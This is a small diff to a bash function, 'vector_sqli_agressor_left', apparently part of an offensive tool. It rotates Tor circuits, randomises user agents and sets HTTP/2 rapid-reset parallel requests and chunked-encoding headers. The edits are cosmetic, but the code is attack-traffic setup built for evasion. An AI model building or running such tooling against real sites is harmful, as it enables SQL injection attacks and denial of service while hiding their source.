@@ -11,7 +11,7 @@ vector_sqli_agressor_left() {
     if [[ "$default_path" == "/" ]]; then
       default_path=""
     fi
-
+    
     local random_port
     random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
 
@@ -25,11 +25,11 @@ vector_sqli_agressor_left() {
 
       local ua_salt
       ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-
       local target_cipher=""
       local target_tls13=""
       local rapid_reset_args="--http2 --parallel --parallel-max 50"
 
+      # Used chunked headers only on POST method.
       local chunked_headers=(-H "Transfer-Encoding: chunked" -H "Content-Type: application/x-www-form-urlencoded")
 
       if [[ "$base_ua" == *"Firefox"* ]]; then
